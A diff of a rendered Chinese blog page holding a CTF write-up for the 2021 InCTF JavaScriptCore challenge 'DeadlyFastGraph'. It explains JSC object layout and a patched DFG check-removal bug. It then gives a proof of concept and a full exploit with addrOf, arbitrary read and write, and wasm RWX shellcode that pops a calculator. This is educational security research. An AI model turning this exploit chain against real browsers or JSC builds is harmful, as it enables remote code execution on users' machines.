@@ -229,7 +229,7 @@
           <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
@@ -366,8 +366,9 @@
     <div class="post-body" itemprop="articleBody">
         <p>2021 inCTF 比赛时未能做出来的题目，jsc 引擎的利用，回过头发现其实很简单，显然这是一道入门级的 jsc 题目，学到了学到了，参照下官方的 wp 了解一下 jsc 的漏洞利用</p>
 <span id="more"></span>
-
-<h2 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h2><p>题目源码以及附件：<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/DeadlyFastGraph">https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/DeadlyFastGraph</a></p>
+<h2 id="题目环境">题目环境</h2>
+<p>题目源码以及附件：<br>
+<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/DeadlyFastGraph">https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/DeadlyFastGraph</a></p>
 <p>题目远程环境是 ubuntu 18.04，本人复现时使用了 ubuntu 20.04</p>
 <p>因为 patch 还把一些调试有用的 describe 函数给去掉了，所以还是自己修改编译一份便于调试：</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;WebKit&#x2F;WebKit.git
@@ -379,9 +380,11 @@ Tools&#x2F;Scripts&#x2F;build-webkit --jsc-only --debug
 cd WebKitBuild&#x2F;Debug&#x2F;bin
 
 .&#x2F;jsc --useConcurrentJIT&#x3D;false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="WebKit"><a href="#WebKit" class="headerlink" title="WebKit"></a>WebKit</h2><p>既然是入门，当然得先了解下 WebKit 的知识，虽然写的是 WebKit，但实际上本文章关注的是 WebKit 中的 JS 引擎，这个 JS 引擎指的是 WebKit 默认的 <strong>JavaScriptCore</strong>(jsc)，而对于 chrome 来说，它的 JS 引擎是 v8</p>
-<h3 id="JSC"><a href="#JSC" class="headerlink" title="JSC"></a>JSC</h3><p>借用一张图来描述 JSC 如何执行 js 代码：<br><img src="/images/a50bb9a6/0.png" alt="jsc"></p>
+<h2 id="WebKit">WebKit</h2>
+<p>既然是入门，当然得先了解下 WebKit 的知识，虽然写的是 WebKit，但实际上本文章关注的是 WebKit 中的 JS 引擎，这个 JS 引擎指的是 WebKit 默认的 <strong>JavaScriptCore</strong>(jsc)，而对于 chrome 来说，它的 JS 引擎是 v8</p>
+<h3 id="JSC">JSC</h3>
+<p>借用一张图来描述 JSC 如何执行 js 代码：<br>
+<img src="/images/a50bb9a6/0.png" alt="jsc"></p>
 <p>和 v8 类似，JSC 也有 JIT，有三种优化：</p>
 <ol>
 <li>BaseLine JIT：函数调用 6 次及以上，或者代码循环超过 100 次触发；编译成中间代码</li>
@@ -389,7 +392,9 @@ cd WebKitBuild&#x2F;Debug&#x2F;bin
 <li>FIL JIT：函数调用上千次或代码循环数万次才会触发，优化更细致，比较复杂</li>
 </ol>
 <p>题目的 patch 引发的问题是 DFG 层面的，熟悉 v8 的话，这方面还是比较好理解的</p>
-<h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><p>再借用一张图如下：<br><img src="/images/a50bb9a6/1.png" alt="jsobject"></p>
+<h3 id="JSObject">JSObject</h3>
+<p>再借用一张图如下：<br>
+<img src="/images/a50bb9a6/1.png" alt="jsobject"></p>
 <p>一个 js 对象在内存中的布局如上图左侧所示，图中的 <code>butterflyIndexingMask</code> 在我的环境中不存在，通过查看最新版 WebKit 源码，也没有发现这个字段，也不知道这东西哪来的，猜测是特殊的 JSObject 才有这个字段或者说这个字段已经被移除了（<strong>仅个人猜测，欢迎有了解的大佬指正</strong></p>
 <p>一个 js 对象主要有以下内容：</p>
 <ul>
@@ -398,8 +403,10 @@ cd WebKitBuild&#x2F;Debug&#x2F;bin
 <li>+0x10：从这个偏移往后存储内联属性的内容</li>
 </ul>
 <p>图中右侧反映了 butterfly 的存储方式，可以看到，数组索引 i 的内容对应于 <code>[butterfly + i*8]</code>，而属性 x （<strong>假设是第一个属性</strong>）的存储在 <code>[butterfly - 0x10]</code>，而 <code>[butterfly - 8]</code> 的存储了数组长度和大小</p>
-<p>例如：<code>var obj1 = [1.5];</code><br><img src="/images/a50bb9a6/3.png" alt="obj1"></p>
-<p>添加一个属性：<code>obj1.a = 5.5;</code><br><img src="/images/a50bb9a6/4.png" alt="obj1.a"></p>
+<p>例如：<code>var obj1 = [1.5];</code><br>
+<img src="/images/a50bb9a6/3.png" alt="obj1"></p>
+<p>添加一个属性：<code>obj1.a = 5.5;</code><br>
+<img src="/images/a50bb9a6/4.png" alt="obj1.a"></p>
 <p>可以看到动态添加了一个属性后，StructureID 和 butterfly 都发生了改变，而且这个属性是存储在 <code>butterfly - 0x10</code> 前面的，不过图中看，这个值并不是准确的 5.5，这个是因为存储属性的地方，存的值都是 JSValue，是 boxed 值，存入的时候要经过编码（box），取出使用要经过解码（unbox）才能得到真实的值</p>
 <p>根据最新版 WebKit 源码的 <code>Source/JavaScriptCore/runtime/JSCJSValue.h</code> 文件里有这么几行注释（<strong>参考链接的那个比较旧了，新版包括题目的版本 double 是从 0002 开始的</strong>）：</p>
 <pre class="line-numbers language-none"><code class="language-none">* The top 15-bits denote the type of the encoded JSValue:
@@ -420,16 +427,21 @@ cd WebKitBuild&#x2F;Debug&#x2F;bin
      *     True:      0x07
      *     Undefined: 0x0a
      *     Null:      0x02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><strong>注意：指针的值 box 和 unbox 时一样的</strong></p>
-<p>手动进行 unbox 之后，发现值正确了：<br><img src="/images/a50bb9a6/5.png" alt="jsvalue"></p>
-<p>还有内联属性的情况也看一看：<code>var obj2 = &#123;a: 1.1, b:2.2&#125;</code>，创建对象的时候指定的属性都是内联属性了，存储在 butterfly 指针后面的内存区域，同样这些值都是 boxed 的：<br><img src="/images/a50bb9a6/6.png" alt="obj2"></p>
-<p>数组索引的值呢，有时候是 boxed 的 有时候是 unboxed 的，在 obj1 中这个数组可以发现，值都是 unboxed 的，也就是不需要解码操作，同时可以发现这个数组的类型标记为了 <strong>CopyOnWriteArrayWithDouble</strong><br><img src="/images/a50bb9a6/8.png" alt="arraytype1"></p>
-<p>再看看另一种情况：<code>var obj3 = [1, 2.2, &#123;&#125;, undefined];</code><br><img src="/images/a50bb9a6/9.png" alt="arraytype2"><br><img src="/images/a50bb9a6/10.png" alt="obj3"></p>
+<p>手动进行 unbox 之后，发现值正确了：<br>
+<img src="/images/a50bb9a6/5.png" alt="jsvalue"></p>
+<p>还有内联属性的情况也看一看：<code>var obj2 = &#123;a: 1.1, b:2.2&#125;</code>，创建对象的时候指定的属性都是内联属性了，存储在 butterfly 指针后面的内存区域，同样这些值都是 boxed 的：<br>
+<img src="/images/a50bb9a6/6.png" alt="obj2"></p>
+<p>数组索引的值呢，有时候是 boxed 的 有时候是 unboxed 的，在 obj1 中这个数组可以发现，值都是 unboxed 的，也就是不需要解码操作，同时可以发现这个数组的类型标记为了 <strong>CopyOnWriteArrayWithDouble</strong><br>
+<img src="/images/a50bb9a6/8.png" alt="arraytype1"></p>
+<p>再看看另一种情况：<code>var obj3 = [1, 2.2, &#123;&#125;, undefined];</code><br>
+<img src="/images/a50bb9a6/9.png" alt="arraytype2"><br>
+<img src="/images/a50bb9a6/10.png" alt="obj3"></p>
 <p>可以看到 butterfly 里存的都是 boxed 的值，同时这个数组标记为 <strong>ArrayWithContiguous</strong></p>
 <p>除了 <strong>CopyOnWriteArrayWithDouble</strong>，还有 <strong>CopyWriteArrayWithInt32</strong>，像 <strong>xxxArrayWithInt32</strong> 的是以 unboxed 形式存储的，<strong>ArrayWithContiguous</strong> 这种就是存的值不是只有一种，只能通过编码来区分了，所以不难理解存的是 boxed 的值</p>
 <p><em>这种机制和 v8 的也很类似，v8 通过最低 bit 来区分对象指针和 Smi，ArrayWithContiguous 相当于 PACKED_ELEMENTS，像 double 值 v8 则通过 HeapNumber 对象来存储，同时利用最低 bit 来区分对象和 Smi</em></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>完整的 patch 如下：</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>完整的 patch 如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">diff --git a&#x2F;Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGConstantFoldingPhase.cpp b&#x2F;Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGConstantFoldingPhase.cpp
 index eaeaf85ea2..a395a979b8 100644
 --- a&#x2F;Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGConstantFoldingPhase.cpp
@@ -477,7 +489,6 @@ index 04f2c970c2..4b7d3ca6cc 100644
              &#123;
                  CustomGetterSetter* custom &#x3D; CustomGetterSetter::create(vm, nullptr, testCustomAccessorSetter);
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>patch 给 ConstantFoldingPhase.cpp 的一处 if 条件判断添加了必定通过条件的一次机会，同时将大量辅助函数给注释掉了（因为调试要使用 debug 等函数，建议自行修改编译）</p>
 <p>这处 patch 使得可以有一次机会无条件消除 <code>CheckStructure</code> 结点，这相当于在 v8 中的 <code>CheckMaps</code>，显然，针对某一对象操作优化后的代码，会对运行时的实际对象进行 Check，如果对象的类型不符合，则进行解优化，如果 <code>CheckStructure</code> 随意的被消除，那么就能造成类型混淆</p>
 <p>构造 poc 如下：</p>
@@ -500,16 +511,17 @@ index 04f2c970c2..4b7d3ca6cc 100644
 <span class="token function">foo</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token function">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// for debug</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>因为 jsc 没有像 v8 那样的 %SystemBreak 函数来下断点，这里就用 print 函数来做断点，调试命令如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">set args --useConcurrentJIT&#x3D;false poc.js
 b functionPrintStdOut
 r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>查看内存分布：<br><img src="/images/a50bb9a6/11.png" alt="poc before dfg"></p>
-<p>继续运行，经过 DFG 优化后，对于 a1 对象，属性 c 在 +0x20 偏移处，而因为类型混淆，将 a2 对象当成 a1 对象的类型对属性 c 写入值，导致 a2 对象 +0x20 处被改写成 0x2333 的 boxed 值：<br><img src="/images/a50bb9a6/12.png" alt="poc after dfg"></p>
+<p>查看内存分布：<br>
+<img src="/images/a50bb9a6/11.png" alt="poc before dfg"></p>
+<p>继续运行，经过 DFG 优化后，对于 a1 对象，属性 c 在 +0x20 偏移处，而因为类型混淆，将 a2 对象当成 a1 对象的类型对属性 c 写入值，导致 a2 对象 +0x20 处被改写成 0x2333 的 boxed 值：<br>
+<img src="/images/a50bb9a6/12.png" alt="poc after dfg"></p>
 <p><em>这张图片的内存地址和前一张不一致是因为，第一次运行忘记截图了，后来补的</em></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>有了类型混淆，后面的利用其实和 v8 差不多，<code>类型混淆 -&gt; 泄露地址 -&gt; 任意地址读写 -&gt; wasm shellcode</code></p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>有了类型混淆，后面的利用其实和 v8 差不多，<code>类型混淆 -&gt; 泄露地址 -&gt; 任意地址读写 -&gt; wasm shellcode</code></p>
 <p>这里对 poc 进行修改一下：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">,</span> c<span class="token operator">:</span><span class="token number">3.3</span><span class="token punctuation">,</span> d<span class="token operator">:</span><span class="token number">4.4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
@@ -525,19 +537,19 @@ r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><s
 <span class="token punctuation">&#125;</span>
 
 <span class="token function">foo</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> a4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// a3 --> butterfly = addrOf(a4)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>可以思考一下，经过类型混淆后，往 a2 对象的 +0x10 + 0x20 处写入 a4 对象的地址，这个位置是什么呢？</p>
 <p>a2 和 a3 对象内存上是紧邻的，a2 有两个内联属性，占用 0x10 个字节的空间，再往后就是 a3 的 JSCell 字段和 butterfly 字段，那么这个 poc 的目的就是将 a3 的 butterfly 指针修改成 a4 对象的地址</p>
 <p><strong>注意：经过测试，对象的地址貌似都是 16 字节对齐的，构造紧邻的对象要注意内存对齐产生的空隙</strong></p>
 <p><strong>那么这之后，<code>a3[1]</code> 就指向了 a4 的 butterfly 字段了，可以修改这个对象进行任意地址读写，同时 <code>a3[2]</code> 就指向了 a4 的第一个内联属性，也就是属性 a，可以进行类型混淆泄露地址</strong></p>
-<h3 id="addrOf"><a href="#addrOf" class="headerlink" title="addrOf"></a>addrOf</h3><p>利用 <code>a3[2]</code> 和 <code>a4.a</code> 进行任意对象地址泄露</p>
+<h3 id="addrOf">addrOf</h3>
+<p>利用 <code>a3[2]</code> 和 <code>a4.a</code> 进行任意对象地址泄露</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 	a4<span class="token punctuation">.</span>a <span class="token operator">=</span> obj<span class="token punctuation">;</span>
 	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>注意：因为 a3 对象创建的时候，0，1 下标都是 double 数值，那么它的类型必定被初始化为 <strong>xxxWithDouble</strong>，那么存取数组的值的时候都是 unboxed 的，那么就不用考虑编码问题了</p>
-<h3 id="ARW"><a href="#ARW" class="headerlink" title="ARW"></a>ARW</h3><p>利用 <code>a3[1]</code> 修改 a4 的 butterfly 字段即可进行任意地址读写，<strong>但是要注意的是地址 -8 偏移处对应的是数组长度和空间大小，不能为 0</strong></p>
+<h3 id="ARW">ARW</h3>
+<p>利用 <code>a3[1]</code> 修改 a4 的 butterfly 字段即可进行任意地址读写，<strong>但是要注意的是地址 -8 偏移处对应的是数组长度和空间大小，不能为 0</strong></p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">arbRead</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ((*(addr - 8)) >> 32) > 0</span>
 	a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// &lt;-- butterfly</span>
 	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -547,8 +559,8 @@ r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><s
 	a3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 	a4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>jsc 和 v8 一样，wasm 同样使用 rwx 权限的段来存放运行的机器码，先找出这个 rwx 权限的地址：</p>
+<h3 id="shellcode">shellcode</h3>
+<p>jsc 和 v8 一样，wasm 同样使用 rwx 权限的段来存放运行的机器码，先找出这个 rwx 权限的地址：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token keyword">let</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -556,9 +568,10 @@ r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><s
 <span class="token keyword">let</span> func <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>
 
 <span class="token function">debug</span><span class="token punctuation">(</span><span class="token function">describe</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在 funtion 对象 +0x38 偏移处发现这个地址：<br><img src="/images/a50bb9a6/13.png" alt="rwx"></p>
-<p>这个地址并不是 rwx 段的起始地址，但这确实是这个 wasm 函数对象的调用的地址，幸运的是，-8 偏移处填满了 0xcc，完全符合任意读写的条件：<br><img src="/images/a50bb9a6/14.png" alt="rwx"></p>
+<p>在 funtion 对象 +0x38 偏移处发现这个地址：<br>
+<img src="/images/a50bb9a6/13.png" alt="rwx"></p>
+<p>这个地址并不是 rwx 段的起始地址，但这确实是这个 wasm 函数对象的调用的地址，幸运的是，-8 偏移处填满了 0xcc，完全符合任意读写的条件：<br>
+<img src="/images/a50bb9a6/14.png" alt="rwx"></p>
 <p>接下来写入 shellcode：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> func_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> rwx_addr <span class="token operator">=</span> <span class="token function">arbRead</span><span class="token punctuation">(</span>func_addr <span class="token operator">+</span> <span class="token number">0x38n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -575,9 +588,10 @@ a3<span class="token punctuation">[</span><span class="token number">1</span><sp
 <span class="token punctuation">&#125;</span>
 
 <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// pwn!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>shellcode 效果是弹计算器：<br><img src="/images/a50bb9a6/15.png" alt="pwn"></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>完整 exp 如下：</p>
+<p>shellcode 效果是弹计算器：<br>
+<img src="/images/a50bb9a6/15.png" alt="pwn"></p>
+<h2 id="exp">exp</h2>
+<p>完整 exp 如下：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// utils ------</span>
 <span class="token keyword">let</span> <span class="token punctuation">[</span>f2i<span class="token punctuation">,</span> i2f<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
 	<span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -671,8 +685,8 @@ a3<span class="token punctuation">[</span><span class="token number">1</span><sp
 
 <span class="token comment">//print(1.1);</span>
 <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<h2 id="参考">参考</h2>
+<ul>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-DeadlyFastGraph/">https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-DeadlyFastGraph/</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.anquanke.com/post/id/251597">https://www.anquanke.com/post/id/251597</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://phrack.org/papers/attacking_javascript_engines.html">http://phrack.org/papers/attacking_javascript_engines.html</a></li>
@@ -770,13 +784,13 @@ a3<span class="token punctuation">[</span><span class="token number">1</span><sp
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">380k</span>
+    <span title="站点总字数">379k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:46</span>
+    <span title="站点阅读时长">5:45</span>
   </span>
 </div>
 <div class="busuanzi-count">
